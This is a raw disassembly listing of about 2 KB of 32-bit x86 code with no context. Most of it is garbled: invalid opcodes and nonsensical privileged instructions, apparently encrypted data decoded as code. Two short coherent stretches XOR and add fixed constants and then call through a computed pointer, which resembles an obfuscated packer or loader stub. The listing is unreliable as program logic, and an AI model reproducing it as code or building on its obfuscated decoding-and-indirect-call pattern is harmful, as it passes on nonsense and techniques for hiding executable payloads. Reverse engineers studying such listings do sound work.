  412393:	mov    ah,0xca
  412395:	add    ebx,ebx
  412397:	push   ecx
  412398:	popf   
  412399:	cmp    DWORD PTR [edi+0x3c],edx
  41239c:	aad    0xfc
  41239e:	dec    ebx
  41239f:	test   eax,0x6efd4006
  4123a4:	push   esp
  4123a5:	jmp    0xc9b781fa
  4123aa:	or     DWORD PTR [edi-0x27025905],ebx
  4123b0:	or     DWORD PTR [ebp+0x52],eax
  4123b3:	dec    eax
  4123b4:	clc    
  4123b5:	cmp    ebp,esp
  4123b7:	push   0xd40a14a2
  4123bc:	retf   0x4441
  4123bf:	aaa    
  4123c0:	mov    WORD PTR [esi+0x4d],fs
  4123c3:	sbb    BYTE PTR [ebp+0x4],ah
  4123c6:	pop    ds
  4123c7:	dec    edi
  4123c8:	inc    edi
  4123c9:	jno    0x41239b
  4123cb:	dec    esp
  4123cc:	inc    eax
  4123cd:	or     DWORD PTR [eax],edi
  4123cf:	cld    
  4123d0:	int    0xfa
  4123d2:	jmp    0xf901:0x8e3edb6d
  4123d9:	ds dec esi
  4123db:	int3   
  4123dc:	inc    ebp
  4123dd:	aas    
  4123de:	jecxz  0x4123cd
  4123e0:	int    0x6f
  4123e2:	(bad)
  4123e5:	pusha  
  4123e6:	addr16 (bad) 
  4123e8:	push   ebx
  4123e9:	inc    eax
  4123ea:	stc    
  4123eb:	popa   
  4123ec:	dec    ebx
  4123ed:	xchg   esp,eax
  4123ee:	xor    al,0x50
  4123f0:	in     eax,dx
  4123f1:	mov    ecx,0xf02cd6c
  4123f6:	les    eax,FWORD PTR [ecx-0x23b26a4f]
  4123fc:	leave  
  4123fd:	cmp    bl,dl
  4123ff:	lds    ebp,FWORD PTR [edi]
  412401:	mov    bh,0x4d
  412403:	lea    edx,[eax-0x55a77c79]
  412409:	mov    bh,BYTE PTR [esi+0x45]
  41240c:	imul   ebp
  41240e:	(bad)  
  41240f:	test   ebp,0x7b455fdc
  412415:	mov    ds:0x3d7b135b,al
  41241a:	or     ebx,DWORD PTR [eax]
  41241c:	jb     0x41244f
  41241e:	sub    DWORD PTR [ecx+0x3e],eax
  412421:	(bad)  
  412422:	lock cmp DWORD PTR [edx+0x6f69df8f],esi
  412429:	jnp    0x4123d4
  41242b:	and    ecx,DWORD PTR [ecx-0x38]
  41242e:	ror    ch,0xa1
  412431:	or     edx,ebx
  412433:	stc    
  412434:	or     esi,DWORD PTR [edi+0xe0c2128]
  41243a:	or     dh,ch
  41243c:	fwait
  41243d:	adc    BYTE PTR [ebx],cl
  41243f:	hlt    
  412440:	int    0x57
  412442:	add    esi,esi
  412444:	in     al,dx
  412445:	in     eax,dx
  412446:	mov    edx,0xd135495e
  41244b:	scas   eax,DWORD PTR es:[edi]
  41244c:	sbb    edi,DWORD PTR [eax-0x5d]
  41244f:	popa   
  412450:	or     eax,0xcffa1137
  412455:	mov    BYTE PTR [ecx+0x4aca750b],dh
  41245b:	pop    esp
  41245c:	stc    
  41245d:	iret   
  41245e:	inc    esi
  41245f:	mov    eax,ds:0x8ff8f7f5
  412464:	mov    edx,0x76614807
  412469:	push   cs
  41246a:	pushf  
  41246b:	stc    
  41246c:	sub    dh,BYTE PTR [ebx-0xcd9e6cd]
  412472:	pop    ds
  412473:	aad    0x15
  412475:	push   es
  412476:	outs   dx,DWORD PTR ds:[esi]
  412477:	mov    ecx,fs
  412479:	cld    
  41247a:	loope  0x412450
  41247c:	xchg   BYTE PTR [eax-0x4f],ch
  41247f:	sbb    al,BYTE PTR [esi-0x5e]
  412482:	jecxz  0x4124bf
  412484:	lds    edi,FWORD PTR [ebx]
  412486:	dec    edi
  412487:	les    ecx,FWORD PTR [ecx+0x34]
  41248a:	data16 cmc 
  41248c:	dec    BYTE PTR [ebx]
  41248e:	mov    bl,0x1f
  412490:	inc    ebp
  412491:	mov    edx,DWORD PTR [edx]
  412493:	sbb    DWORD PTR [esi+0x13],edx
  412496:	mov    WORD PTR [ecx],fs
  412498:	dec    esp
  412499:	dec    ebx
  41249a:	in     eax,0xe2
  41249c:	pop    es
  41249d:	dec    ebp
  41249e:	push   ecx
  41249f:	add    al,0xc6
  4124a1:	adc    eax,0x1277e380
  4124a6:	jb     0x4124ec
  4124a8:	xchg   edi,eax
  4124a9:	call   0x9ed7:0x4b8f7085
  4124b0:	hlt    
  4124b1:	xor    al,0xb1
  4124b3:	loopne 0x412531
  4124b5:	sub    DWORD PTR [ebp+0x7454a9e1],esi
  4124bb:	cli    
  4124bc:	add    DWORD PTR gs:[ebx-0x1c134516],edx
  4124c3:	pop    ds
  4124c4:	not    BYTE PTR [edi]
  4124c6:	stc    
  4124c7:	test   al,0xe5
  4124c9:	push   cs
  4124ca:	push   0xc2c9c89f
  4124cf:	ins    DWORD PTR es:[edi],dx
  4124d0:	and    DWORD PTR [eax+0xcfd6e97],ecx
  4124d6:	enter  0xc2b8,0xd0
  4124da:	into   
  4124db:	mov    DWORD PTR [ebx],0x45890845
  4124e1:	lock mov eax,DWORD PTR [ebp-0x1c]
  4124e5:	test   eax,eax
  4124e7:	je     0x4129b7
  4124ed:	mov    DWORD PTR [ebp-0x24],esi
  4124f0:	push   0xb
  4124f2:	pop    ecx
  4124f3:	push   0x5
  4124f5:	dec    ecx
  4124f6:	pop    ebx
  4124f7:	xchg   ebx,ecx
  4124f9:	sub    ebx,ecx
  4124fb:	xchg   ebx,ecx
  4124fd:	dec    ecx
  4124fe:	mov    eax,DWORD PTR [ebp-0x1c]
  412501:	imul   eax,ecx
  412504:	sub    esp,eax
  412506:	mov    DWORD PTR [ebp-0x24],esp
  412509:	mov    eax,DWORD PTR [ebp-0x4]
  41250c:	mov    ecx,0x7510851
  412511:	xor    eax,ecx
  412513:	mov    edx,0x327299
  412518:	add    eax,edx
  41251a:	mov    DWORD PTR [ebp+0x8],eax
  41251d:	mov    eax,DWORD PTR [ebp-0x18]
  412520:	xor    eax,ecx
  412522:	add    eax,edx
  412524:	mov    edx,DWORD PTR [ebp+0x14]
  412527:	imul   eax,DWORD PTR [edx]
  41252a:	mov    edx,DWORD PTR [ebp-0x4]
  41252d:	xor    edx,ecx
  41252f:	mov    ecx,DWORD PTR [ebp+0x8]
  412532:	lea    ecx,[edx+ecx*1+0x327299]
  412539:	cmp    ecx,eax
  41253b:	je     0x4129b2
  412541:	mov    edi,DWORD PTR [ebp-0x18]
  412544:	mov    eax,DWORD PTR [ebp+0x8]
  412547:	mov    edx,DWORD PTR [ebp+0x14]
  41254a:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  41254e:	mov    ecx,0x7510851
  412553:	xor    edx,edx
  412555:	xor    edi,ecx
  412557:	mov    esi,0x327299
  41255c:	add    edi,esi
  41255e:	div    edi
  412560:	mov    edx,DWORD PTR [ebp-0x4]
  412563:	xor    edx,ecx
  412565:	lea    eax,[edx+eax*1+0x327299]
  41256c:	mov    edx,DWORD PTR [ebp+0x8]
  41256f:	mov    edi,DWORD PTR [ebp-0x24]
  412572:	mov    DWORD PTR [edi+edx*4],eax
  412575:	mov    eax,DWORD PTR [ebp-0x18]
  412578:	mov    edx,DWORD PTR [ebp+0x8]
  41257b:	xor    eax,ecx
  41257d:	lea    eax,[eax+edx*1+0x327299]
  412584:	mov    DWORD PTR [ebp+0x8],eax
  412587:	mov    eax,DWORD PTR [ebp-0x18]
  41258a:	mov    edx,DWORD PTR [ebp+0x14]
  41258d:	jmp    0x41278d
  412592:	inc    esp
  412593:	mov    edx,0x5c849cfa
  412598:	pop    esp
  412599:	push   edx
  41259a:	outs   dx,BYTE PTR ds:[esi]
  41259b:	outs   dx,DWORD PTR ds:[esi]
  41259c:	stos   DWORD PTR es:[edi],eax
  41259d:	(bad)  
  41259e:	ror    al,cl
  4125a0:	test   eax,0x7e5d5984
  4125a5:	jle    0x412600
  4125a7:	jg     0x412627
  4125a9:	jle    0x412576
  4125ab:	push   esp
  4125ac:	fsub   QWORD PTR [edi+0x6945e61f]
  4125b2:	pop    edi
  4125b3:	and    DWORD PTR [ebx+eax*1],edi
  4125b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125b7:	clc    
  4125b8:	sbb    DWORD PTR [ebx],ebp
  4125ba:	std    
  4125bb:	push   esi
  4125bc:	out    0xa7,eax
  4125be:	xor    edi,ecx
  4125c0:	call   0x4fbdf346
  4125c5:	test   BYTE PTR [ebx+0x1d],ah
  4125c8:	leave  
  4125c9:	outs   dx,BYTE PTR ds:[esi]
  4125ca:	retf   
  4125cb:	fiadd  WORD PTR [ebx]
  4125cd:	pop    ecx
  4125ce:	adc    DWORD PTR [edi+ecx*4+0x5c],0x28
  4125d3:	xchg   esp,eax
  4125d4:	fadd   QWORD PTR ds:0xc7a3dfb5
  4125da:	xchg   edx,eax
  4125db:	xchg   esp,eax
  4125dc:	inc    eax
  4125dd:	aaa    
  4125de:	xchg   edi,eax
  4125df:	ret    0xe558
  4125e2:	inc    ecx
  4125e3:	addr16 in eax,dx
  4125e5:	jmp    0x4125a7
  4125e7:	(bad)  
  4125e8:	mov    esp,0x8d99ab83
  4125ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125ee:	jbe    0x4125f5
  4125f0:	and    ebp,edx
  4125f2:	cmp    DWORD PTR ss:[edx+0x7a],esp
  4125f6:	jno    0x4125c4
  4125f8:	or     BYTE PTR [edi+eiz*4+0x64],ch
  4125fc:	retf   
  4125fd:	push   ecx
  4125fe:	ja     0x412634
  412600:	inc    ecx
  412601:	sahf   
  412602:	aas    
  412603:	ret    0x79af
  412606:	mov    dl,0xc9
  412608:	push   esp
  412609:	daa    
  41260a:	jp     0x412671
  41260c:	lods   al,BYTE PTR ds:[esi]
  41260d:	lds    eax,FWORD PTR [eax-0x18]
  412610:	sub    dh,BYTE PTR [eax-0x11e8b909]
  412616:	dec    eax
  412617:	mov    eax,0xaed7e0eb
  41261c:	shr    BYTE PTR [edx+0x17614600],0xa
  412623:	mov    dl,dh
  412625:	out    0xb3,eax
  412627:	pop    ecx
  412628:	mov    ebp,0x150807b8
  41262d:	popa   
  41262e:	js     0x4125d0
  412630:	leave  
  412631:	cmp    BYTE PTR [eax],dl
  412633:	fdivrp st(5),st
  412635:	outs   dx,DWORD PTR ds:[esi]
  412636:	xchg   DWORD PTR [esi-0x1388d1e4],esp
  41263c:	jnp    0x4125de
  41263e:	push   edi
  41263f:	test   eax,0xba85e1e
  412644:	push   ss
  412645:	lods   al,BYTE PTR ds:[esi]
  412646:	hlt    
  412647:	sbb    edi,DWORD PTR [edi-0x72]
  41264a:	jb     0x4126c9
  41264c:	push   ds
  41264d:	stos   DWORD PTR es:[edi],eax
  41264e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41264f:	jbe    0x41262d
  412651:	pop    edi
  412652:	(bad)  
  412654:	leave  
  412655:	mov    ecx,0x7f1d1811
  41265a:	int    0xe1
  41265c:	sar    BYTE PTR [ebx],1
  41265e:	xchg   DWORD PTR [ebx+0x78],edx
  412661:	jp     0x4126a8
  412663:	popf   
  412664:	jl     0x412693
  412666:	push   esp
  412667:	mov    esi,0x86210b74
  41266c:	std    
  41266d:	mov    WORD PTR [eax-0x78],?
  412670:	and    ah,cl
  412672:	jge    0x4126ad
  412674:	clc    
  412675:	or     eax,0x9596b7a7
  41267a:	call   DWORD PTR [eax-0x50]
  41267d:	and    bh,BYTE PTR [edi]
  41267f:	inc    ebx
  412680:	daa    
  412681:	dec    esi
  412682:	xor    al,BYTE PTR [edx]
  412684:	mov    bh,0xef
  412686:	enter  0x6cd,0xf0
  41268a:	int3   
  41268b:	cmp    BYTE PTR [ebx],ch
  41268d:	or     eax,0x4082774
  412692:	std    
  412693:	mov    cl,0xc9
  412695:	mov    ah,0xf9
  412697:	and    dl,BYTE PTR [ecx-0x218c734e]
  41269d:	iret   
  41269e:	jne    0x412633
  4126a0:	cwde   
  4126a1:	xor    ebx,0x148fe566
  4126a7:	push   es
  4126a8:	push   ecx
  4126a9:	test   BYTE PTR [esi],0xe6
  4126ac:	jmp    FWORD PTR [ecx-0x36]
  4126af:	ins    BYTE PTR es:[edi],dx
  4126b0:	xlat   BYTE PTR ds:[ebx]
  4126b1:	ret    
  4126b2:	or     DWORD PTR [esi],esi
  4126b4:	jb     0x412687
  4126b6:	sbb    ebx,DWORD PTR [edi-0x7c6c248]
  4126bc:	enter  0xdcd5,0x10
  4126c0:	ja     0x41268f
  4126c2:	fld    QWORD PTR [esi+0x2110639a]
  4126c8:	repz popf 
  4126ca:	ins    DWORD PTR es:[edi],dx
  4126cb:	mov    edi,0xbd52fc79
  4126d0:	fistp  WORD PTR [edi*8-0x7c72bbec]
  4126d7:	fwait
  4126d8:	fwait
  4126d9:	mov    ah,0x95
  4126db:	cmp    BYTE PTR [ebp+0x5c],0x2b
  4126df:	out    dx,al
  4126e0:	(bad)  
  4126e1:	addr16 data16 hlt 
  4126e4:	nop
  4126e5:	gs scas eax,DWORD PTR es:[edi]
  4126e7:	(bad)  
  4126e8:	aad    0x3a
  4126ea:	cs mov ecx,0xb1da8db1
  4126f0:	test   eax,esi
  4126f2:	(bad)  
  4126f3:	mov    ecx,0xc290dad6
  4126f8:	loop   0x4126da
  4126fa:	sahf   
  4126fb:	cmp    DWORD PTR [edi+0x5b],edx
  4126fe:	ja     0x4126a7
  412700:	sub    DWORD PTR [ebp+ebp*2+0x71077bfb],0x69
  412708:	adc    al,0x50
  41270a:	push   ecx
  41270b:	shl    DWORD PTR [edx*4+0x29dac881],cl
  412712:	cmp    dh,cl
  412714:	cwde   
  412715:	add    eax,0x1e550978
  41271a:	or     BYTE PTR [ebx],ah
  41271c:	mov    cl,0xd7
  41271e:	out    0x9e,eax
  412720:	in     eax,0x4e
  412722:	mov    al,0x1b
  412724:	cmp    al,0xdd
  412726:	fisub  DWORD PTR [eax+0x1c]
  412729:	cmp    eax,0xc15d9d27
  41272e:	xor    eax,0x2cf69355
  412733:	push   0xffffffdf
  412735:	adc    al,0xaa
  412737:	fsubr  QWORD PTR [esi-0x19]
  41273a:	cmp    edx,edi
  41273c:	pop    edx
  41273d:	test   ah,dh
  41273f:	inc    ecx
  412740:	jo     0x4126c7
  412742:	vmread DWORD PTR [ebp+0x6b2e745b],esp
  412749:	pusha  
  41274a:	add    BYTE PTR [ebp-0x48],ah
  41274d:	cmp    esp,esp
  41274f:	cs add eax,0xff9c9545
  412755:	ds push edi
  412757:	cs jne 0x4126e9
  41275a:	xchg   ebp,eax
  41275b:	scas   al,BYTE PTR es:[edi]
  41275c:	pop    ds
  41275d:	add    al,0xaf
  41275f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412760:	imul   esp,edi,0xb8900a03
  412766:	ret    0xd324
  412769:	jl     0x4127e1
  41276b:	push   esi
  41276c:	inc    edx
  41276d:	sahf   
  41276e:	and    al,BYTE PTR [esi]
  412770:	pushf  
  412771:	inc    eax
  412772:	pop    ds
  412773:	cmp    bh,ah
  412775:	add    eax,0xf86e4f73
  41277a:	push   esi
  41277b:	fimul  DWORD PTR [edi]
  41277d:	jge    0x4127a8
  41277f:	enter  0xb937,0x1b
  412783:	jo     0x412741
  412785:	test   BYTE PTR [ebp-0x7078b113],ah
  41278b:	pop    ss
  41278c:	adc    DWORD PTR [ebx],esi
  41278e:	shr    ecx,0xfb
  412791:	add    DWORD PTR [eax],eax
  412793:	add    BYTE PTR [edi],dh
  412795:	cmp    al,0xc7
  412797:	cdq    
  412798:	int    0x75
  41279a:	jno    0x412758
  41279c:	ja     0x41277e
  41279e:	loope  0x4127ba
  4127a0:	cmp    dh,dh
  4127a2:	add    al,0xd5
  4127a4:	inc    esp
  4127a5:	pop    edi
  4127a6:	jle    0x412826
  4127a8:	pop    ecx
  4127a9:	jg     0x412829
  4127ab:	jle    0x4127e6
  4127ad:	jb     0x4127f4
  4127af:	mov    ch,0x65
  4127b1:	rcl    bh,1
  4127b3:	out    0x3a,al
  4127b5:	xlat   BYTE PTR ds:[ebx]
  4127b6:	lods   al,BYTE PTR ds:[esi]
  4127b7:	in     eax,dx
  4127b8:	mov    ecx,0x6c22da86
  4127bd:	push   ebp
  4127be:	or     cl,BYTE PTR ds:0xc6315bd5
  4127c4:	daa    
  4127c5:	mov    ebp,0x36edf8f6
  4127ca:	sub    al,0x8
  4127cc:	jecxz  0x4127eb
  4127ce:	loop   0x412847
  4127d0:	cmc    
  4127d1:	and    DWORD PTR [ebp+0x64],edx
  4127d4:	lods   eax,DWORD PTR ds:[esi]
  4127d5:	enter  0xb748,0x18
  4127d9:	pop    ebx
  4127da:	outs   dx,DWORD PTR ds:[esi]
  4127db:	sub    eax,0x9a127fd4
  4127e0:	cmp    eax,0xc212a17b
  4127e5:	push   esp
  4127e6:	scas   eax,DWORD PTR es:[edi]
  4127e7:	das    
  4127e8:	ins    DWORD PTR es:[edi],dx
  4127e9:	push   cs
  4127ea:	cmp    eax,0x88c438b7
  4127ef:	fsubp  st(1),st
  4127f1:	push   0x7f
  4127f3:	adc    ch,BYTE PTR [esi]
  4127f5:	pop    ebx
  4127f6:	push   0x6dc950d2
  4127fb:	das    
  4127fc:	pop    eax
  4127fd:	lahf   
  4127fe:	pop    ecx
  4127ff:	mov    dh,0x7f
  412801:	or     DWORD PTR gs:[eax+0x2b],edi
  412805:	push   eax
  412806:	ret    0x3998
  412809:	in     eax,0x3
  41280b:	lds    ebx,FWORD PTR [ebx+0x5b088af2]
  412811:	adc    BYTE PTR [esi+ecx*2-0x3596b3e2],bh
  412818:	sub    eax,0x845a63c2
  41281d:	addr16 ret 
  41281f:	and    esi,DWORD PTR [edx]
  412821:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412822:	cmp    ebx,DWORD PTR [eax-0x3063a73]
  412828:	sub    al,BYTE PTR ds:0x4605f37a
  41282e:	dec    edi
  41282f:	cmc    
  412830:	add    al,0x65
  412832:	ins    DWORD PTR es:[edi],dx
  412833:	xchg   BYTE PTR [ebx+0x42],bh
  412836:	sbb    eax,0xb3f9302e
  41283b:	and    esp,DWORD PTR [ebx+ecx*4-0x13d8fb4f]
  412842:	pop    es
  412843:	not    BYTE PTR [edi-0x69]
  412846:	dec    eax
  412847:	outs   dx,DWORD PTR ds:[esi]
  412848:	sub    al,0xc7
  41284a:	shl    BYTE PTR [eax+0xf],0x7f
  41284e:	inc    esi
  41284f:	out    0x14,al
  412851:	icebp  
  412852:	mov    al,0x9d
  412854:	push   esi
  412855:	xor    dl,BYTE PTR [edi+0xf666152]
  41285b:	jmp    0x4128d3
  41285d:	sbb    DWORD PTR [edx],0x375ec2a2
  412863:	or     eax,DWORD PTR [esi]
  412865:	jge    0x412864
  412867:	or     eax,0xc1c0a0f
  41286c:	call   FWORD PTR [edi+0x2c372b2c]
  412872:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412873:	mov    dl,0xa9
  412875:	(bad)
  41287a:	push   cs
  41287b:	lods   eax,DWORD PTR ds:[esi]
  41287c:	sub    eax,0x5ae356c6
  412881:	shl    DWORD PTR [esi-0x37],1
  412884:	loopne 0x41281e
  412886:	mov    dh,0x2c
  412888:	(bad)  
  41288a:	adc    cl,BYTE PTR [ebx+edx*8+0x123504f3]
  412891:	cs stos DWORD PTR es:[edi],eax
  412893:	adc    edi,ecx
  412895:	sbb    DWORD PTR [edi+0x5a],0x530b562d
  41289c:	ja     0x41289a
  41289e:	sbb    al,BYTE PTR [esi+0x20]
  4128a1:	fwait
  4128a2:	loope  0x412897
  4128a4:	and    eax,0x47884301
  4128a9:	dec    ecx
  4128aa:	in     al,0xf1
  4128ac:	clc    
  4128ad:	inc    ecx
  4128ae:	ror    DWORD PTR ds:0x6d31f26f,cl
  4128b4:	pop    esp
  4128b5:	arpl   sp,bx
  4128b7:	lahf   
  4128b8:	cmc    
  4128b9:	xor    edi,DWORD PTR [esi-0x8a1cdb5]
  4128bf:	mov    dh,0xe0
  4128c1:	mov    ah,0xfb
  4128c3:	lods   al,BYTE PTR ds:[esi]
  4128c4:	or     edi,esi
  4128c6:	test   al,0x17
  4128c8:	loopne 0x412949
  4128ca:	sub    eax,0xdc81a421
  4128cf:	mov    al,0xfb
  4128d1:	jo     0x4128d7
  4128d3:	aam    0x75
  4128d5:	and    ah,BYTE PTR [ebp-0x6c77d711]
  4128db:	inc    ecx
  4128dc:	jae    0x4128b8
  4128de:	ret    
  4128df:	add    DWORD PTR ds:0xc56904be,0x4d
  4128e6:	pop    eax
  4128e7:	inc    esp
  4128e8:	cdq    
  4128e9:	cs daa 
  4128eb:	jne    0x412944
  4128ed:	outs   dx,BYTE PTR ds:[esi]
  4128ee:	xor    dl,ch
  4128f0:	xor    bl,BYTE PTR [edi-0x56c1c066]
  4128f6:	mov    esi,0x8042e33d
  4128fb:	cmp    BYTE PTR [edi+eax*2],cl
  4128fe:	mov    esp,0xb8a17230
  412903:	dec    ecx
  412904:	leave  
  412905:	adc    BYTE PTR [edx-0x6f99d1fa],dl
  41290b:	mov    bh,0x30
  41290d:	sar    DWORD PTR [ebx+0x3708970f],cl
  412913:	ret    0x8f9b
  412916:	dec    ebp
  412917:	pop    es
  412918:	aas    
  412919:	or     DWORD PTR [ecx],esp
  41291b:	or     ecx,DWORD PTR [esi+esi*8+0x3902bbf9]
  412922:	cmp    eax,0x3cc5e23d
  412927:	cdq    
  412928:	mov    bh,0xab
  41292a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41292b:	jae    0x4128cb
  41292d:	xchg   ebp,eax
  41292e:	xor    esi,DWORD PTR [ebx+0x3591db5b]
  412934:	or     ebp,DWORD PTR [ebx]
  412936:	mov    bl,0xb4
  412938:	mov    edx,0x106b33b6
  41293d:	fcmovnu st,st(5)
  41293f:	test   BYTE PTR [edx+0x33],ah
  412942:	enter  0xe4f5,0x8d
  412946:	sti    
  412947:	stos   BYTE PTR es:[edi],al
  412948:	sbb    eax,0x40cf7551
  41294d:	or     al,dh
  41294f:	or     al,0x2d
  412951:	imul   eax,DWORD PTR [ebx+0x5cbc6a1c],0x2f
  412958:	loopne 0x4129b5
  41295a:	pop    ecx
  41295b:	or     esp,edi
  41295d:	mov    ebp,DWORD PTR [ebp-0x5a6c0a35]
  412963:	call   0xbb06776
  412968:	call   0x6c0c:0x14287097
  41296f:	mov    edx,0x5dda7326
  412974:	dec    ecx
  412975:	lahf   
  412976:	retf   
  412977:	imul   esp,DWORD PTR [ecx+eax*4+0x61],0x5a326ee2
  41297f:	ja     0x412936
  412981:	call   0xc7d0bfba
  412986:	add    al,0x45
  412988:	mov    bl,0x7f
  41298a:	rcl    BYTE PTR [eax-0x59],1
  41298d:	dec    edx
  41298e:	xchg   DWORD PTR [ebx],eax
  412990:	(bad)  
  412991:	imul   eax,DWORD PTR [edx]
  412994:	mov    edx,DWORD PTR [ebp-0x4]
  412997:	xor    edx,ecx
  412999:	mov    ecx,DWORD PTR [ebp+0x8]
  41299c:	lea    ecx,[edx+ecx*1+0x327299]
  4129a3:	cmp    ecx,eax
  4129a5:	jne    0x412541
  4129ab:	mov    ebx,esi
  4129ad:	jmp    0x4129b7
  4129b2:	mov    ebx,0x327299
  4129b7:	mov    eax,DWORD PTR [ebp-0x4]
  4129ba:	xor    eax,0x7510851
  4129bf:	add    eax,ebx
  4129c1:	mov    DWORD PTR [ebp-0xc],eax
  4129c4:	xor    ebx,ebx
  4129c6:	lea    eax,[ebp-0x10]
  4129c9:	add    ebx,DWORD PTR [eax]
  4129cb:	call   ebx
  4129cd:	xor    ebx,ebx
  4129cf:	inc    ebx
  4129d0:	cmp    DWORD PTR [ebp+0x10],ebx
  4129d3:	je     0x412bf1
  4129d9:	xchg   edx,eax
  4129da:	push   0xa
  4129dc:	pop    ecx
  4129dd:	jmp    0x412bdd
  4129e2:	jmp    0x757c:0x13b47be7
  4129e9:	popa   
  4129ea:	cmc    
  4129eb:	xchg   dh,dl
  4129ed:	fcomp  DWORD PTR ds:0xa73c2522
  4129f3:	pop    ecx
  4129f4:	jle    0x412a74
  4129f6:	pop    ecx
  4129f7:	jg     0x412a77
  4129f9:	jle    0x412a22
  4129fb:	xchg   ebx,eax
  4129fc:	in     al,dx
  4129fd:	js     0x412a15
  4129ff:	pushf  
  412a00:	loopne 0x4129a8
  412a02:	xchg   esi,eax
  412a03:	cmp    ecx,esi
  412a05:	stos   DWORD PTR es:[edi],eax
  412a06:	xchg   edx,eax
  412a07:	scas   eax,DWORD PTR es:[edi]
  412a08:	xchg   DWORD PTR [edx+0x27d48046],ecx
  412a0e:	push   esi
  412a0f:	mov    DWORD PTR [edi+0x3d68c8e4],ebx
  412a15:	and    DWORD PTR [esi-0x7d],eax
  412a18:	adc    al,0x57
  412a1a:	pop    ecx
  412a1b:	pop    edx
  412a1c:	rcl    BYTE PTR [ebx+eiz*1],1
  412a1f:	adc    bh,ah
  412a21:	xchg   edi,eax
  412a22:	or     dl,BYTE PTR [ecx]
  412a24:	fldcw  WORD PTR [ebx+0x231f3dee]
  412a2a:	adc    eax,0x1ad1679d
  412a2f:	mov    ah,0x92
  412a31:	in     al,0x58
  412a33:	pop    ds
  412a34:	jno    0x412a8d
  412a36:	sbb    ebp,edi
  412a38:	pusha  
  412a39:	push   esi
  412a3a:	stos   BYTE PTR es:[edi],al
  412a3b:	rcr    BYTE PTR [ebx+0x3a],cl
  412a3e:	mov    es,WORD PTR [edi-0x6b]
  412a41:	mov    al,0x45
  412a43:	data16 arpl WORD PTR [esi-0x33],cx
  412a47:	mov    fs,WORD PTR [esi]
  412a49:	cmc    
  412a4a:	jp     0x4129e2
  412a4c:	mov    DWORD PTR [ebx],eax
  412a4e:	outs   dx,BYTE PTR ds:[esi]
  412a4f:	jno    0x412aa7
  412a51:	es int3 
  412a53:	outs   dx,BYTE PTR ds:[esi]
  412a54:	clc    
  412a55:	jmp    0x412a31
  412a57:	xchg   edx,eax
  412a58:	add    BYTE PTR [edx],0xb7
  412a5b:	mov    BYTE PTR [bx+di],0x8
  412a5f:	sub    BYTE PTR [edx],ch
  412a61:	jns    0x412a47
  412a63:	jb     0x412a6c
  412a65:	dec    edx
  412a66:	dec    edi
  412a67:	mov    cl,0x7c
  412a69:	xor    eax,0x2a04e07d
  412a6e:	xchg   edx,eax
  412a6f:	fdiv   DWORD PTR [eax-0x6466f021]
  412a75:	mov    WORD PTR [ebx+0x6b534c20],ds
  412a7b:	call   0xf891:0x12e564c4
  412a82:	fild   WORD PTR [ebx+0x39d83fbe]
  412a88:	out    0xb4,eax
  412a8a:	jle    0x412ae7
  412a8c:	and    BYTE PTR [edx+0x53],0x7b
  412a90:	inc    eax
  412a91:	call   0x8cf3:0x8ffbcc71
  412a98:	push   ds
  412a99:	mov    ebp,ecx
  412a9b:	ins    DWORD PTR es:[edi],dx
  412a9c:	arpl   WORD PTR [edi],bp
  412a9e:	sub    DWORD PTR [ebp+0x47],esp
  412aa1:	cwde   
  412aa2:	push   esi
  412aa3:	mov    esi,0x4fdfbebf
  412aa8:	aad    0x28
  412aaa:	xor    eax,0x8fe6f5db
  412aaf:	sub    BYTE PTR [esi+eiz*4],ch
  412ab2:	mov    ebx,0x8bb18ae6
  412ab7:	das    
  412ab8:	jle    0x412acd
  412aba:	push   ds
  412abb:	shr    BYTE PTR [ebx-0x63],cl
  412abe:	mov    WORD PTR [edx-0x5c32ef8b],cs
  412ac4:	lods   eax,DWORD PTR ss:[esi]
  412ac6:	test   eax,0xbcc50bc8
  412acb:	sbb    esp,DWORD PTR [ebx-0x5692626e]
  412ad1:	mov    ds,WORD PTR [ebp-0x6e]
  412ad4:	xor    DWORD PTR [esi+0x707c47c0],0x3c841947
  412ade:	fcom   st(3)
  412ae0:	cmc    
  412ae1:	and    DWORD PTR [ebx+0x3889e8e],edx
  412ae7:	mov    eax,ds:0xe1672008
  412aec:	xchg   edx,eax
  412aed:	xchg   edx,eax
  412aee:	and    ah,BYTE PTR [edx+ebp*8]
  412af1:	int3   
  412af2:	sub    al,0x7b
  412af4:	(bad)  
  412af5:	enter  0x1cb7,0x1d
  412af9:	pop    esi
  412afa:	hlt    
  412afb:	xchg   ecx,eax
  412afc:	push   0xd3efc8cb
  412b01:	leave  
  412b02:	lea    ebp,[ecx+0x49]
  412b05:	mov    BYTE PTR [ebp-0x326bf42d],0xee
  412b0c:	test   al,0x72
  412b0e:	dec    esi
  412b0f:	xor    eax,0xc360cbc1
  412b14:	jnp    0x412b22
  412b16:	rol    BYTE PTR [edx-0x4a],cl
  412b19:	ins    DWORD PTR es:[edi],dx
  412b1a:	sahf   
  412b1b:	xor    eax,0x9b4ce0d
  412b20:	lods   eax,DWORD PTR ds:[esi]
  412b21:	cmp    DWORD PTR [edi+0x32],edi
  412b24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b25:	ror    BYTE PTR ds:0xd7156d5b,1
  412b2b:	pushf  
  412b2c:	out    0x2f,eax
  412b2e:	xor    eax,0xa90233a7
  412b34:	cwde   
  412b35:	ffree  st(3)
  412b37:	std    
  412b38:	sub    eax,0x79ed5dd9
  412b3d:	fdiv   st,st(4)
  412b3f:	push   ebp
  412b40:	out    dx,eax
  412b41:	add    BYTE PTR [esi],0x37
  412b44:	pop    ebx
  412b45:	sub    eax,0x34b27386
  412b4a:	cmp    BYTE PTR [esp+edi*2+0x6fa7407e],bh
  412b51:	and    edi,eax
  412b53:	jbe    0x412b21
  412b55:	int3   
  412b56:	dec    ecx
  412b57:	cwde   
  412b58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b59:	jae    0x412adb
  412b5b:	cmp    edi,DWORD PTR [eax]
  412b5d:	push   edi
  412b5e:	daa    
  412b5f:	(bad)  
  412b61:	in     eax,0x97
  412b63:	sub    DWORD PTR [eax-0x5a],esp
